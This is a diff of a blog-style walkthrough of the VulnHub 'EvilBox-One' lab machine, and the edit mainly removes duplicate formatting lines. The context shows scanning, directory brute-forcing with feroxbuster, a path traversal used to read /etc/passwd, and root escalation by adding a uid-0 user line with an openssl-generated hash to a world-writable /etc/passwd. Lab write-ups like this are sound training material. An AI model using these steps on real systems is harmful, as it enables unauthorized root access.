@@ -19,7 +19,6 @@ image:
 IP : 10.10.2.51
 ```
 {: .nolineno}
-{: .nolineno}
 
 ## Port Scan Results ➡️
 
@@ -43,7 +42,6 @@ MAC Address: 08:00:27:94:F8:26 (Oracle VirtualBox virtual NIC)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 {: .nolineno}
-{: .nolineno}
 
 ## Web Enumeration ➡️
 
@@ -55,13 +53,12 @@ Now lets see the Directory Listing files —>
 feroxbuster -u http://10.0.2.51:80/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -o ferox_80.json --depth 2 -C 403,404 -x php,html,txt,js
 ```
 {: .nolineno}
-{: .nolineno}
 
 ![Untitled](/Vulnhub-Files/img/EvilBox-One/Untitled%202.png)
 
 Now lets look at `/secret/evil.php` file —>
 
-Since it is blank I think this url is vulnerable to directory traversal attack , but for that I need a parameter on which basis I am gona search the `/etc/passwd` file —>   
+Since it is blank I think this url is vulnerable to path traversal attack , but for that I need a parameter on which basis I am gona search the `/etc/passwd` file —>   
 
 Lets use burpsuite for that —>
 
@@ -112,7 +109,6 @@ mowree@EvilBoxOne:~$ cat user.txt
 mowree@EvilBoxOne:~$
 ```
 {: .nolineno}
-{: .nolineno}
 
 Now lets see some file permissions and looks like I got something interesting →
 
@@ -120,7 +116,6 @@ Now lets see some file permissions and looks like I got something interesting �
 mowree@EvilBoxOne:/var/backups$ ls -al /etc/passwd
 -rw-rw-rw- 1 root root 1398 ago 16  2021 /etc/passwd
 ```
-{: .nolineno}
 {: .nolineno}
 
 Now I have the permission to write so lets add a user name as `shiv` and `password` as password with root privileges.
@@ -138,14 +133,12 @@ $ openssl passwd -1 -salt salt password
 $1$salt$qJH7.N4xYta3aEG/dfqo/0
 ```
 {: .nolineno}
-{: .nolineno}
 
 we need to add some data in order for it to be aligned with the `/etc/passwd` format. This is the final result:
 
 ```bash
 shiv:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0::/root:/bin/bash
 ```
-{: .nolineno}
 {: .nolineno}
 
 I named the user `shiv`. now lets write into the `/etc/passwd` file with nano →
